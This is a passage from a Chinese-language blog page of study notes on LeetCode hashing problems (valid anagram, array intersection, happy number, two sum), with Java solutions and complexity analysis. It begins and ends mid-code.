&amp;&amp; nums[lo] == nums[lo - <span class="number">1</span>]))</span><br><span class="line">            ++lo;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target || (hi &lt; nums.length - <span class="number">1</span> &amp;&amp; nums[hi] == nums[hi + <span class="number">1</span>]))</span><br><span class="line">            --hi;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            res.add(Arrays.asList(nums[lo++], nums[hi--]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242.有效的字母异位词"></a>242.有效的字母异位词</h2><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的 字母异位词。<br>示例 1:<br>输入: s &#x3D; “anagram”, t &#x3D; “nagaram”<br>输出: true</p><p>示例 2:<br>输入: s &#x3D; “rat”, t &#x3D; “car”<br>输出: false</p><p>数组其实就是一个简单哈希表，而且这道题目中字符串只有小写字符，那么就可以定义一个数组，来记录字符串s里字符出现的次数。需要定义一个多大的数组呢，定一个数组叫做record，大小为26 就可以了，初始化为0，因为字符a到字符z的ASCII也是26个连续的数值。<br>定义一个数组叫做record用来上记录字符串s里字符出现的次数。<br>需要把字符映射到数组也就是哈希表的索引下标上，因为字符a到字符z的ASCII是26个连续的数值，所以字符a映射为下标0，相应的字符z映射为下标25。<br>再遍历 字符串s的时候，只需要将 s[i] - ‘a’ 所在的元素做+1 操作即可，并不需要记住字符a的ASCII，只要求出一个相对数值就可以了。 这样就将字符串s中字符出现的次数，统计出来了。<br>那看一下如何检查字符串t中是否出现了这些字符，同样在遍历字符串t的时候，对t中出现的字符映射哈希表索引上的数值再做-1的操作。<br>那么最后检查一下，record数组如果有的元素不为零0，说明字符串s和t一定是谁多了字符或者谁少了字符，return false。<br>最后如果record数组所有元素都为零0，说明字符串s和t是字母异位词，return true。<br>时间复杂度为O(n)，空间上因为定义是的一个常量大小的辅助数组，所以空间复杂度为O(1)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            record[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; t.length(); i++)&#123;</span><br><span class="line">            record[t.charAt(i) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> count: record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(count != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以用排序的方法做</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] str1 = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] str2 = t.toCharArray();</span><br><span class="line">        Arrays.sort(str1);</span><br><span class="line">        Arrays.sort(str2);</span><br><span class="line">        <span class="keyword">return</span> Arrays.equals(str1, str2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(nlogn)，其中 n 为 s 的长度。排序的时间复杂度为 O(nlogn)，比较两个字符串是否相等时间复杂度为 O(n)，因此总体时间复杂度为 O(nlogn+n)&#x3D;O(nlogn)。<br>空间复杂度：O(logn)。排序需要 O(logn) 的空间复杂度。注意，在某些语言（比如 Java &amp; JavaScript）中字符串是不可变的，因此我们需要额外的 O(n) 的空间来拷贝字符串。但是我们忽略这一复杂度分析，因为：这依赖于语言的细节，也取决于函数的设计方式，例如，可以将函数参数类型更改为 char[]。</p><h2 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349. 两个数组的交集"></a>349. 两个数组的交集</h2><p>给定两个数组 nums1 和 nums2 ，返回 它们的 交集。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序 。</p><ol><li>使用HashSet：计算两个数组的交集，直观的方法是遍历数组 nums1，对于其中的每个元素，遍历数组 nums2 判断该元素是否在数组 nums2 中，如果存在，则将该元素添加到返回值。假设数组 nums1 和 nums2 的长度分别是 m 和 n，则遍历数组 nums1 需要 O(m) 的时间，判断 nums1 中的每个元素是否在数组 nums2 中需要 O(n) 的时间，因此总时间复杂度是 O(mn)。<br>如果使用哈希集合存储元素，则可以在 O(1) 的时间内判断一个元素是否在集合中，从而降低时间复杂度。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; resSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历数组1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 遍历数组2看哈希表里是否有</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i))&#123;</span><br><span class="line">                resSet.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//方法1：将结果集合转为数组</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resSet.stream().mapToInt(x -&gt; x).toArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方法2：另外申请一个数组存放setRes中的元素,最后返回数组</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[resSet.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resSet)&#123;</span><br><span class="line">            arr[j++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>使用Hash数组<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">                resList.add(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res[] = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resList)</span><br><span class="line">            res[index++] = i;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>排序 + 双指针<br>如果两个数组是有序的，则可以使用双指针的方法得到两个数组的交集。<br>首先对两个数组进行排序，然后使用两个指针遍历两个数组。可以预见的是加入答案的数组的元素一定是递增的，为了保证加入元素的唯一性，我们需要额外记录变量 pre 表示上一次加入答案数组的元素。<br>初始时，两个指针分别指向两个数组的头部。每次比较两个指针指向的两个数组中的数字，如果两个数字不相等，则将指向较小数字的指针右移一位，如果两个数字相等，且该数字不等于 pre ，将该数字添加到答案并更新 pre 变量，同时将两个指针都右移一位。当至少有一个指针超出数组范围时，遍历结束。<br>时间复杂度：O(mlogm+nlogn)，其中 m 和 n 分别是两个数组的长度。对两个数组排序的时间复杂度分别是 O(mlogm) 和 O(nlogn)，双指针寻找交集元素的时间复杂度是 O(m+n)，因此总时间复杂度是 O(mlogm+nlogn)。<br>空间复杂度：O(logm+logn)，其中 m 和 n 分别是两个数组的长度。空间复杂度主要取决于排序使用的额外空间。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Arrays.sort(nums1);</span><br><span class="line">        Arrays.sort(nums2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="type">int</span>[] intersection = <span class="keyword">new</span> <span class="title class_">int</span>[length1 + length2];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// 保证加入元素的唯一性</span></span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">0</span> || num1 != intersection[index - <span class="number">1</span>]) &#123;</span><br><span class="line">                    intersection[index++] = num1;</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOfRange(intersection, <span class="number">0</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="第202题-快乐数"><a href="#第202题-快乐数" class="headerlink" title="第202题. 快乐数"></a>第202题. 快乐数</h2><p>编写一个算法来判断一个数 n 是不是快乐数。</p><p>「快乐数」 定义为：</p><p>对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。<br>然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。<br>如果这个过程 结果为 1，那么这个数就是快乐数。<br>如果 n 是 快乐数 就返回 true ；不是，则返回 false 。</p><p>示例 1：</p><blockquote><p>输入：n &#x3D; 19<br>输出：true<br>解释：<br>12 + 92 &#x3D; 82<br>82 + 22 &#x3D; 68<br>62 + 82 &#x3D; 100<br>12 + 02 + 02 &#x3D; 1<br>示例 2：<br>输入：n &#x3D; 2<br>输出：false</p></blockquote><p>这道题我感觉主要涉及两个知识点：</p><ol><li>可以通过对10取余数来获取每个位置的数值</li><li>题目中提到了无限循环，其实我们可以发现如果在重复的过程中出现了之前的数，那么就会有无限循环，所以可以用一个set来判断<br>题解如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (n!= <span class="number">1</span> &amp;&amp; !record.contains(n))&#123;</span><br><span class="line">            record.add(n);</span><br><span class="line">            n = getNextNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNextNumber</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            res += temp * temp;</span><br><span class="line">            n = n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>确定这个问题的时间复杂度对于一个「简单」级别的问题来说是一个挑战。如果您对这些问题还不熟悉，可以尝试只计算 getNext(n) 函数的时间复杂度。</li></ol><p>时间复杂度：O(243⋅3+logn+loglogn+logloglogn)… &#x3D; O(logn)。</p><ul><li>查找给定数字的下一个值的成本为 O(logn)，因为我们正在处理数字中的每位数字，而数字中的位数由 logn 给定。</li><li>要计算出总的时间复杂度，我们需要仔细考虑循环中有多少个数字，它们有多大。</li><li>我们在上面确定，一旦一个数字低于 243，它就不可能回到 243 以上。因此，我们就可以用 243 以下最长循环的长度来代替 243，不过，因为常数无论如何都无关紧要，所以我们不会担心它。</li><li>对于高于 243 的 n，我们需要考虑循环中每个数高于 243 的成本。通过数学运算，我们可以证明在最坏的情况下，这些成本将是 O(logn)+O(loglogn)+O(logloglogn)…。幸运的是，O(logn) 是占主导地位的部分，而其他部分相比之下都很小（总的来说，它们的总和小于logn），所以我们可以忽略它们。<br>空间复杂度：O(logn)。与时间复杂度密切相关的是衡量我们放入哈希集合中的数字以及它们有多大的指标。对于足够大的 n，大部分空间将由 n 本身占用。我们可以很容易地优化到 O(243⋅3)&#x3D;O(1)，方法是只保存集合中小于 243 的数字，因为对于较高的数字，无论如何都不可能返回到它们。</li></ul><p>力扣上给出了更好的解法：<br>使用 “快慢指针” 思想，找出循环：“快指针” 每次走两步，“慢指针” 每次走一步，当二者相等时，即为一个循环周期。此时，判断是不是因为 1 引起的循环，是的话就是快乐数，否则不是快乐数。<br>注意：此题不建议用集合记录每次的计算结果来判断是否进入循环，因为这个集合可能大到无法存储；另外，也不建议使用递归，同理，如果递归层次较深，会直接导致调用栈崩溃。不要因为这个题目给出的整数是 int 型而投机取巧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">bitSquareSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bit</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            sum += bit * bit;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> n, fast = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            slow = bitSquareSum(slow);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">        &#125; <span class="keyword">while</span> (slow != fast);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> slow == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(logn)。该分析建立在对前一种方法的分析的基础上，但是这次我们需要跟踪两个指针而不是一个指针来分析，以及在它们相遇前需要绕着这个循环走多少次。</p><ul><li>如果没有循环，那么快跑者将先到达 1，慢跑者将到达链表中的一半。我们知道最坏的情况下，成本是 O(2⋅logn)&#x3D;O(logn)。</li><li>一旦两个指针都在循环中，在每个循环中，快跑者将离慢跑者更近一步。一旦快跑者落后慢跑者一步，他们就会在下一步相遇。假设循环中有 k 个数字。如果他们的起点是相隔 k−1 的位置（这是他们可以开始的最远的距离），那么快跑者需要 k−1 步才能到达慢跑者，这对于我们的目的来说也是不变的。因此，主操作仍然在计算起始 n 的下一个值，即 O(logn)。<br>空间复杂度：O(1)，对于这种方法，我们不需要哈希集来检测循环。指针需要常数的额外空间。</li></ul><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a>1. 两数之和</h2><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。<br>你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。<br>你可以按任意顺序返回答案。</p><p>示例 1：</p><blockquote><p>输入：nums &#x3D; [2,7,11,15], target &#x3D; 9<br>输出：[0,1]<br>解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</p></blockquote><p>示例 2：</p><blockquote><p>输入：nums &#x3D; [3,2,4], target &#x3D; 6<br>输出：[1,2]</p></blockquote><p>示例 3：</p><blockquote><p>输入：nums &#x3D; [3,3], target &#x3D; 6<br>输出：[0,1]</p></blockquote><p>重点是可以一边遍历,一边对比map中是否有想要的结构,这样就只需要一遍遍历就好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(temp);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; indexMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">balance</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(indexMap.containsKey(balance))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, indexMap.get(balance)&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                indexMap.put(nums[i], i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以用双指针解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> m=<span class="number">0</span>, n=<span class="number">0</span>, k, board=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span>[] tmp1 = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        <span class="comment">// 备份原来下标的数组</span></span><br><span class="line">        System.arraycopy(nums, <span class="number">0</span>, tmp1, <span class="number">0</span>, nums.length);</span><br><span class="line">        <span class="comment">// 将nums排序</span></span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 双指针</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = nums.length-<span class="number">1</span>; i&lt;j;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] &lt; target)</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] &gt; target)</span><br><span class="line">            j--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">            m=i;</span><br><span class="line">            n=j;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        